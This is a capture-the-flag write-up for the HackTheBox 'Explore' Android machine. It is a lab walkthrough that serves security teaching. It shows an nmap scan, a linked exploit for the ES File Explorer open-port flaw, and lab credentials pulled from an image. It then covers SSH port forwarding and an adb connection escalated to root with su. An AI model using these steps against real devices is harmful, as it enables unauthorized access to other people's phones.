# Hackthebox Explore

![explore](/explore.png)

**Operating System** : Android

**Difficulty** : Easy

**Points** : 20

**Creator** : bertolis
# Nmap scan

```bash
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
5555/tcp  filtered freeciv
34399/tcp open     unknown
42135/tcp open     http    ES File Explorer Name Response httpd
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).

```

# ES File Explorer Vuln
Searching for the port, we find that this port is due to a vulnerability in ES File Explorer can be exploited to get a shell.

I used a python script from https://github.com/fs0c131y/ESFileExplorerOpenPortVuln

Looking at the user's pics, we find an image called creds.jpg.

<img src="/cap_creds.jpg" style="width:10%;">

So the potential credentials are :

```bash
kristi:Kr1sT!5h@Rp3xPl0r3!
```

Using this we can login as kristi through ssh.

# Privelege Escalation
Checking for any open local ports which are not open publically, we find that port 5555 is accessible locally.

```bash
:/ $ netstat -tulpn | grep LISTEN
tcp6       0      0 ::ffff:127.0.0.1:40397  :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      3173/net.xnano.android.sshserver
tcp6       0      0 ::ffff:10.10.10.2:41427 :::*                    LISTEN      -
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 :::42135                :::*                    LISTEN      -
tcp6       0      0 :::59777                :::*                    LISTEN      -
:/ $
```

Let's reverse tunnel this using ssh using the command

```bash
ssh kristi@10.10.10.247 -p2222 -L 5555:127.0.0.1:5555
```

Searching about port 5555 on android, I find out that this port is open due to adb and we can just connect to it and get root shell using adb.

```bash
$ adb connect localhost:5555                                                        

connected to localhost:5555
$ adb -s emulator-5554 shell
x86_64:/ $ whoami
shell
127|x86_64:/ $ su
127|:/ # whoami
root
```

# Getting user and root flags
We have got root so now we can find and cat both the flags

```bash
:/ # find / 2>/dev/null | grep root.txt
/data/root.txt
:/ # find / 2>/dev/null | grep user.txt
/storage/emulated/0/user.txt
/mnt/runtime/write/emulated/0/user.txt
/mnt/runtime/read/emulated/0/user.txt
/mnt/runtime/default/emulated/0/user.txt
/data/media/0/user.txt
:/ # wc -c /data/root.txt
33 /data/root.txt
:/ # wc -c /storage/emulated/
0/    obb/
:/ # wc -c /storage/emulated/0/user.txt
33 /storage/emulated/0/user.txt
```
